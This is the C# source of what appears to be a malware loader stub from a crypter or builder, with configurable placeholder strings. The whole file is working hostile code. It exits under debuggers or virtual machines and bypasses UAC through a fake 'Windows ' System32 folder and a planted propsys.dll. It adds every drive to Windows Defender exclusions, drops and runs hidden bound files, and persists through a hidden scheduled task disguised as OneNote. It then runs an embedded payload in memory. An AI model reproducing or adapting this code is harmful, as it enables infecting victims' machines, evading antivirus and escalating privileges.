using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Net;

namespace NAMESPACE
{

    internal class CLASS
    {
#if SINGLE_INSTANCE
        static Mutex mutex;
#endif
        static bool IsAdmin;

        static void Main()
        {
            Process currentProcess = Process.GetCurrentProcess();
            string batPath = Console.Title;

#if UAC_BYPASS || STARTUP || FAKE_ERROR || BINDER
            using (var identity = WindowsIdentity.GetCurrent())
            {
                IsAdmin = new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
            }
#endif

#if SINGLE_INSTANCE
            bool createdNew;
            mutex = new Mutex(false, "mutex_str", out createdNew);
            if (!createdNew)
            {
                Environment.Exit(0);
            }
#endif

            bool remotedebug = false;
            CheckRemoteDebuggerPresent(currentProcess.Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                Environment.Exit(0);
            }

#if ANTI_VM
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                ManagementObjectCollection instances = searcher.Get();
                foreach (ManagementBaseObject inst in instances)
                {
                    string manufacturer = inst["Manufacturer"].ToString().ToLower();
                    if ((manufacturer == "microsoft corporation" && inst["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || inst["Model"].ToString() == "VirtualBox")
                    {
                        Environment.Exit(0);
                    }
                }
            }
#endif

#if BOT_KILLER
#if UAC_BYPASS
            if (!IsAdmin) {
#endif
            Thread.Sleep(1000);
            Assembly.Load(Uncompress(GetEmbeddedResource("BK")))
              .GetType("BotKiller.Program")
              .GetMethod("Main")
              .Invoke(null, null);
#if UAC_BYPASS
            }
#endif
#endif

#if UAC_BYPASS
            Version osversion = Environment.OSVersion.Version;
            if ((osversion.Major >= 6 && osversion.Minor >= 1) || osversion.Major >= 10)
            {
                try
                {
                    if (!IsAdmin)
                    {
                        Directory.CreateDirectory("\\\\?\\C:\\Windows \\System32");
                        File.Copy("C:\\Windows\\System32\\ComputerDefaults.exe", "C:\\Windows \\System32\\ComputerDefaults.exe", true);
                        File.WriteAllBytes("C:\\Windows \\System32\\propsys.dll", Uncompress(GetEmbeddedResource("UAC")));
#if SINGLE_INSTANCE
                        mutex.Dispose();
#endif
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows \\System32\\ComputerDefaults.exe",
                            Arguments = "\"" + batPath + "\"",
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                    }
                    Directory.Delete("\\\\?\\C:\\Windows ", true);
                }
                catch { }
#if WDEX
                try
                {
                    var roots = new List<string>();
                    foreach (var di in DriveInfo.GetDrives())
                    {
                        roots.Add("'" + di.RootDirectory.ToString() + "'");
                    }
                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = "powershell.exe",
                        Arguments = "add-mppreference -exclusionpath @(" + string.Join(",", roots) + ")",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                }
                catch { }
#endif
            }
#endif

#if FAKE_ERROR || BINDER || STARTUP
            bool isStartup = IsStartup(Path.ChangeExtension(batPath, null));
#endif

#if FAKE_ERROR
#if !STARTUP_FE
            if (!isStartup) {
#endif
            Process.Start(new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = "Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('msgbox_str')), 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)",
                WindowStyle = ProcessWindowStyle.Hidden
            });
#if !STARTUP_FE
            }
#endif
#endif

#if BINDER
#if !STARTUP_B
            if (!isStartup)
            {
#endif
                Assembly asm = Assembly.GetExecutingAssembly();
                foreach (string name in asm.GetManifestResourceNames())
                {
                    if (name == "P" || name == "LP" || name == "UAC" || name == "BK") continue;
                    string path = AppDomain.CurrentDomain.BaseDirectory + "\\" + name;
                    if (File.Exists(path))
                        File.Delete(path);
                    File.WriteAllBytes(path, Uncompress(GetEmbeddedResource(name)));
                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c start \"\" \"" + path + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden
                    });
                }
#if !STARTUP_B
            }
#endif
#endif

#if STARTUP
            if (!isStartup)
            {
                InstallStartup(batPath);
            }
#endif

#if DELAY
            Thread.Sleep(int.Parse("delay_str"));
#endif

            byte[] payload = Uncompress(GetEmbeddedResource("P"));

#if DROP_FILE
            Thread.Sleep(1000);
            string droppath = Path.GetTempPath() + Path.GetRandomFileName() + ".exe";
            File.WriteAllBytes(droppath, payload);
            Process.Start(new ProcessStartInfo()
            {
                FileName = droppath,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            Environment.Exit(0);
#else
#if NATIVE
            Assembly.Load(Uncompress(GetEmbeddedResource("LP")))
               .GetType("LoadPE.LoadPE")
               .GetMethod("Run")
               .Invoke(null, new object[] { payload });
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { new string[] { } }); }
            catch { entry.Invoke(null, null); }
#endif
#if MTATHREAD
            Thread.Sleep(-1);
#endif
#endif
        }

#if STARTUP
        static void InstallStartup(string batPath)
        {
            string newpath = string.Empty;
            if (IsAdmin)
            {
                newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Networkstartup_strMan.cmd";
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "Register-ScheduledTask -TaskName 'OneNote startup_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            else
            {
                string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (!Directory.Exists(startup))
                    Directory.CreateDirectory(startup);
                newpath = startup + "\\Networkstartup_strMan.cmd";
            }

            if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;

            File.WriteAllBytes(newpath, File.ReadAllBytes(batPath));
#if MELT_FILE
            File.Delete(batPath);
#endif
#if SINGLE_INSTANCE
            mutex.Dispose();
#endif
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/c start \"\" \"" + newpath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);
        }
#endif

        static byte[] Uncompress(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        static byte[] GetEmbeddedResource(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }

#if FAKE_ERROR || BINDER || STARTUP
        static bool IsStartup(string path)
        {
            if (IsAdmin)
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "[Console]::Title = ((Get-ScheduledTask).Actions.Execute -join '').Contains('" + path + "')",
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
                return Console.Title.ToLower() == "true";
            }
            else
            {
                foreach (string skey in new string[]
                {
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
                })
                {
                    using (var key = Registry.CurrentUser.OpenSubKey(skey))
                    {
                        foreach (string name in key.GetValueNames())
                        {
                            if (((string)key.GetValue(name)).Contains(path))
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            return path.IndexOf(Environment.GetFolderPath(Environment.SpecialFolder.Startup), StringComparison.OrdinalIgnoreCase) == 0;
        }
#endif

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        [DllImport("Kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);
    }
}